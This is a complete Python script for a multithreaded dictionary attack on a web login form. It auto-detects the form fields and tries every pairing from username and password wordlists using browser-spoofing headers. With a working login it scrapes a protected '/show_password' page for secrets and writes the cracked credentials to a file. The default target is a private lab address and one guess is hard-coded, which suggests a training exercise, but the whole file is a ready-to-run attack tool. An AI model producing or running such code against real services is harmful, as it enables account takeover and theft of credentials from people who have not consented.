import requests
import time
import logging
import sys
import os
import threading
import queue
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('dict_attack.log'),
        logging.StreamHandler(sys.stdout)  # Also print to console
    ]
)

# Thread-safe print lock
print_lock = threading.Lock()

def safe_print(*args, **kwargs):
    """Thread-safe print function"""
    with print_lock:
        print(*args, **kwargs)

class DictionaryAttacker:
    def __init__(self, base_url: str, verbose: bool = False, delay: float = 0.1):
        """Initialize the dictionary attacker"""
        self.base_url = base_url
        self.login_url = f"{base_url}/login"
        self.password_url = f"{base_url}/show_password"
        self.verbose = verbose
        self.delay = delay
        
        # Thread-safe collections
        self.successful_credentials = []
        self.credentials_lock = threading.Lock()
        self.progress_counter = 0
        self.counter_lock = threading.Lock()
        
        # Form field names (will be detected automatically)
        self.username_field = "username"
        self.password_field = "password"
        
        # Try to detect form field names
        self._detect_form_fields()

    def _detect_form_fields(self):
        """Detect login form field names"""
        try:
            session = requests.Session()
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }
            
            response = session.get(self.login_url, headers=headers, timeout=5)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                login_form = soup.find('form')
                
                if login_form:
                    # Look for username field
                    username_input = login_form.find('input', {'type': 'text'})
                    if username_input and username_input.get('name'):
                        self.username_field = username_input['name']
                        logging.info(f"Detected username field: {self.username_field}")
                    
                    # Look for password field
                    password_input = login_form.find('input', {'type': 'password'})
                    if password_input and password_input.get('name'):
                        self.password_field = password_input['name']
                        logging.info(f"Detected password field: {self.password_field}")
                    
                    # Get form action if available
                    form_action = login_form.get('action', 'Same URL')
                    logging.info(f"Form action: {form_action}")
                    
                    # If form action is specified and not empty, update login URL
                    if form_action and form_action != 'Same URL':
                        if form_action.startswith('/'):
                            # Absolute path
                            self.login_url = f"{self.base_url}{form_action}"
                        elif form_action.startswith('http'):
                            # Full URL
                            self.login_url = form_action
                        else:
                            # Relative path
                            self.login_url = f"{self.base_url}/{form_action}"
                        logging.info(f"Updated login URL to: {self.login_url}")
                else:
                    logging.warning("Could not find login form on page")
            else:
                logging.warning(f"Could not access login page: {response.status_code}")
        except Exception as e:
            logging.error(f"Error detecting form fields: {str(e)}")
            logging.info("Using default field names: username/password")

    def access_protected_resource(self, session):
        """Access the protected resource (/show_password) after successful login"""
        try:
            safe_print(f"[*] Attempting to access protected resource: {self.password_url}")
            response = session.get(self.password_url, timeout=5)
            
            if response.status_code == 200:
                safe_print(f"[+] Successfully accessed protected resource!")
                # Try to extract password or sensitive information
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Look for password in various ways
                password_content = None
                
                # Method 1: Look for specific elements that might contain passwords
                password_elements = soup.find_all(['div', 'span', 'p', 'pre', 'code', 'h1', 'h2', 'h3', 'h4'])
                for element in password_elements:
                    text = element.get_text().strip().lower()
                    if any(keyword in text for keyword in ['password', 'secret', 'key', 'credential', 'token']):
                        password_content = element.get_text().strip()
                        break
                
                # Method 2: Look for password in the entire page content
                if not password_content:
                    page_text = soup.get_text()
                    lines = [line.strip() for line in page_text.split('\n') if line.strip()]
                    for line in lines:
                        if any(keyword in line.lower() for keyword in ['password', 'secret', 'key', 'credential', 'token']):
                            password_content = line
                            break
                
                if password_content:
                    safe_print(f"[+] Found sensitive information: {password_content}")
                    return {"status": "success", "content": password_content, "response": response.text[:500]}
                else:
                    safe_print(f"[+] Protected resource accessed, but no clear password found")
                    return {"status": "success", "content": "No clear password found", "response": response.text[:500]}
            else:
                safe_print(f"[-] Failed to access protected resource. Status code: {response.status_code}")
                return {"status": "failed", "status_code": response.status_code}
                
        except Exception as e:
            safe_print(f"[-] Error accessing protected resource: {str(e)}")
            return {"status": "error", "message": str(e)}

    def test_authentication(self, username: str, password: str, total_attempts: int) -> Dict:
        """Test authentication with provided credentials"""
        try:
            session = requests.Session()
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }
            
            # Prepare form data with detected field names
            form_data = {
                self.username_field: username,
                self.password_field: password
            }
            
            # Update progress counter
            with self.counter_lock:
                self.progress_counter += 1
                current = self.progress_counter
                
                # Print progress periodically
                if current % 10 == 0 or current == total_attempts:
                    progress = (current / total_attempts) * 100
                    safe_print(f"[*] Progress: {current}/{total_attempts} ({progress:.1f}%)")
            
            # Print current attempt if verbose
            if self.verbose:
                safe_print(f"Trying: {username}:{password}")
            
            response = session.post(
                self.login_url,
                data=form_data,
                headers=headers,
                timeout=5,
                allow_redirects=True  # Follow redirects
            )
            
            # Determine success based on response characteristics
            success = False
            
            # Store the final URL after redirects
            final_url = response.url
            
            # Check for successful login indicators
            if final_url != self.login_url and "login" not in final_url.lower():
                # We were redirected away from login page
                success = True
            elif response.status_code == 200:
                # Check for success indicators in the response text
                success_indicators = ["welcome", "dashboard", "success", "logged in", "account", "profile", "logout"]
                failure_indicators = ["invalid", "failed", "incorrect", "wrong", "error", "try again"]
                
                success = any(indicator in response.text.lower() for indicator in success_indicators)
                failure = any(indicator in response.text.lower() for indicator in failure_indicators)
                
                # If we found explicit failure indicators, override success
                if failure:
                    success = False
            
            result = {
                "username": username,
                "password": password,
                "status_code": response.status_code,
                "success": success,
                "length": len(response.text),
                "final_url": final_url
            }
            
            # Check if successful
            if success:
                safe_print(f"\n[!] SUCCESS! Valid credentials found: {username}:{password}")
                safe_print(f"[+] Final URL: {final_url}")
                logging.warning(f"Valid credentials found: {username}:{password}")
                
                # Try to access protected resource
                protected_resource = self.access_protected_resource(session)
                result["protected_resource"] = protected_resource
                
                # Add to successful credentials list (thread-safe)
                with self.credentials_lock:
                    self.successful_credentials.append({
                        "username": username, 
                        "password": password,
                        "protected_resource": protected_resource
                    })
            
            # Small delay to avoid overwhelming the server
            time.sleep(self.delay)
            
            return result

        except requests.exceptions.RequestException as e:
            logging.error(f"Authentication error for {username}:{password} - {str(e)}")
            return {"error": str(e), "username": username, "password": password}

    def test_specific_credentials(self, username: str, password: str) -> bool:
        """Test a specific set of credentials and return success status"""
        safe_print(f"\n[*] Testing specific credentials: {username}:{password}")
        result = self.test_authentication(username, password, 1)
        return result.get("success", False)

    def run_dictionary_attack(self, usernames: List[str], passwords: List[str], num_threads: int = 10) -> List[Dict]:
        """Run multithreaded dictionary attack using ThreadPoolExecutor"""
        # Calculate total attempts
        total_attempts = len(usernames) * len(passwords)
        
        # Generate all username/password combinations
        credentials = [(username, password) for username in usernames for password in passwords]
        
        safe_print(f"\n[*] Starting ThreadPool dictionary attack with {len(usernames)} usernames and {len(passwords)} passwords")
        safe_print(f"[*] Total combinations to try: {total_attempts}")
        safe_print(f"[*] Using ThreadPoolExecutor with {num_threads} workers")
        safe_print(f"[*] Using form fields: {self.username_field}={'{username}'}, {self.password_field}={'{password}'}")
        
        # Use ThreadPoolExecutor to manage threads
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            # Submit all tasks to the executor
            future_to_creds = {
                executor.submit(self.test_authentication, username, password, total_attempts): (username, password)
                for username, password in credentials
            }
            
            # Process results as they complete
            for future in as_completed(future_to_creds):
                try:
                    # Get the result (but we don't need to do anything with it here
                    # since test_authentication already handles success tracking)
                    future.result()
                except Exception as e:
                    username, password = future_to_creds[future]
                    logging.error(f"Exception for {username}:{password} - {str(e)}")
        
        return self.successful_credentials

def load_wordlist(file_path: str) -> List[str]:
    """Load wordlist from file"""
    if not os.path.exists(file_path):
        safe_print(f"[!] Error: Wordlist file not found: {file_path}")
        return []
    
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description='Dictionary Attack Tool')
    parser.add_argument('-u', '--url', type=str, default="http://10.1.1.10:5002",
                        help='Target URL (default: http://10.1.1.10:5002)')
    parser.add_argument('-t', '--threads', type=int, default=20,
                        help='Number of threads to use (default: 20)')
    parser.add_argument('-d', '--delay', type=float, default=0.1,
                        help='Delay between requests in seconds (default: 0.1)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
    parser.add_argument('--usernames', type=str, default="usernames.txt",
                        help='Path to usernames wordlist (default: usernames.txt)')
    parser.add_argument('--passwords', type=str, default="passwords.txt",
                        help='Path to passwords wordlist (default: passwords.txt)')
    parser.add_argument('--test-creds', action='store_true',
                        help='Test specific credentials (Nocky:1234) before running full attack')
    
    return parser.parse_args()

def main():
    # Parse command line arguments
    args = parse_arguments()
    
    # Target URL
    target_url = args.url
    
    # Default wordlists if not specified
    default_usernames = ["admin", "user", "root", "administrator", "test", "guest", "demo", "manager", "Nocky"]
    default_passwords = ["password", "123456", "admin", "root", "qwerty", "test", "123", "1234", "12345", "welcome"]
    
    # Check for wordlist files
    username_file = args.usernames
    password_file = args.passwords
    
    # Number of threads to use
    num_threads = args.threads
    
    # Verbose output
    verbose = args.verbose
    
    # Delay between requests
    delay = args.delay
    
    safe_print("\n=== Starting ThreadPool Dictionary Attack ===")
    safe_print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    safe_print(f"Target URL: {target_url}")
    safe_print(f"Threads: {num_threads}")
    safe_print(f"Delay: {delay} seconds")
    safe_print(f"Verbose: {'Yes' if verbose else 'No'}")
    safe_print("==============================================\n")
    
    # Create attacker
    attacker = DictionaryAttacker(target_url, verbose=verbose, delay=delay)
    
    # Test specific credentials if requested
    if args.test_creds:
        specific_username = "Nocky"
        specific_password = "1234"
        success = attacker.test_specific_credentials(specific_username, specific_password)
        if success:
            safe_print(f"[+] Specific credentials test SUCCESSFUL: {specific_username}:{specific_password}")
            safe_print("[+] Adding these credentials to the successful list")
            attacker.successful_credentials.append({"username": specific_username, "password": specific_password})
        else:
            safe_print(f"[-] Specific credentials test FAILED: {specific_username}:{specific_password}")
    
    # Load wordlists
    usernames = load_wordlist(username_file) if os.path.exists(username_file) else default_usernames
    passwords = load_wordlist(password_file) if os.path.exists(password_file) else default_passwords
    
    # Make sure Nocky and 1234 are in the wordlists
    if "Nocky" not in usernames:
        usernames.append("Nocky")
    if "1234" not in passwords:
        passwords.append("1234")
    
    safe_print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords")
    
    # Run attack
    start_time = time.time()
    successful_credentials = attacker.run_dictionary_attack(usernames, passwords, num_threads)
    end_time = time.time()
    
    # Calculate elapsed time
    elapsed_time = end_time - start_time
    
    # Summary
    safe_print("\n=== Attack Complete ===")
    safe_print(f"Total combinations tried: {len(usernames) * len(passwords)}")
    safe_print(f"Successful credentials found: {len(successful_credentials)}")
    safe_print(f"Time elapsed: {elapsed_time:.2f} seconds")
    safe_print(f"Average time per attempt: {(elapsed_time / (len(usernames) * len(passwords))):.4f} seconds")
    
    if successful_credentials:
        safe_print("\nSuccessful credentials:")
        for i, creds in enumerate(successful_credentials, 1):
            safe_print(f"{i}. Username: {creds['username']}, Password: {creds['password']}")
            if 'protected_resource' in creds:
                protected_info = creds.get('protected_resource', {})
                if protected_info.get('status') == 'success':
                    safe_print(f"   Protected Resource: {protected_info.get('content', 'N/A')}")
    else:
        safe_print("\nNo valid credentials found.")
    
    # Save results to file
    results_file = "successful_credentials.txt"
    if successful_credentials:
        with open(results_file, 'w') as f:
            f.write(f"# Dictionary Attack Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Target: {target_url}\n\n")
            for creds in successful_credentials:
                f.write(f"{creds['username']}:{creds['password']}\n")
                if 'protected_resource' in creds:
                    protected_info = creds.get('protected_resource', {})
                    if protected_info.get('status') == 'success':
                        f.write(f"# Protected Resource: {protected_info.get('content', 'N/A')}\n")
        safe_print(f"\n[*] Saved successful credentials to {results_file}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        safe_print("\n\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        safe_print(f"\n[!] An error occurred: {str(e)}")
        logging.error(f"Main execution error: {str(e)}")
        sys.exit(1)
        
